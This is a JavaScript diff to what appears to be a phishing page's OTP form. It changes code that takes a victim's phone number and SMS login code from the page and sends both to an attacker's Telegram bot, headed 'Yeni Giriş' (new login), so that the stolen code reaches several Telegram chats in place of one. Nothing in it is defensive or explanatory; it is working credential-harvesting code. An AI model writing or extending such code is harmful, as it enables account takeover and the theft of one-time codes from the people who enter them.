@@ -41,33 +41,34 @@ otpInput.addEventListener('input', function () {
     this.value = this.value.replace(/\D/g, '');
 });
 
-// Update Telegram message with SMS code
+// Update Telegram message with SMS code (all chats)
 async function updateTelegramMessage(smsCode) {
-    const messageId = localStorage.getItem('tg_message_id');
+    const messageIdsStr = localStorage.getItem('tg_message_ids');
     const phone = localStorage.getItem('tg_phone');
 
-    if (!messageId || !phone) return false;
+    if (!messageIdsStr || !phone) return false;
 
+    const messageIds = JSON.parse(messageIdsStr);
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/editMessageText`;
     const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n🔑 SMS Kod: <code>${smsCode}</code>`;
 
-    try {
-        const res = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.CHAT_ID,
-                message_id: parseInt(messageId),
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-        const data = await res.json();
-        return data.ok;
-    } catch (e) {
-        console.error('Telegram update error:', e);
-        return false;
+    for (const [chatId, msgId] of Object.entries(messageIds)) {
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    message_id: parseInt(msgId),
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) {
+            console.error('Telegram update error for chat ' + chatId + ':', e);
+        }
     }
+    return true;
 }
 
 // Submit button
@@ -89,7 +90,7 @@ submitBtn.addEventListener('click', async function () {
     await updateTelegramMessage(otp);
 
     // Clean up localStorage
-    localStorage.removeItem('tg_message_id');
+    localStorage.removeItem('tg_message_ids');
     localStorage.removeItem('tg_phone');
 
     setTimeout(() => {
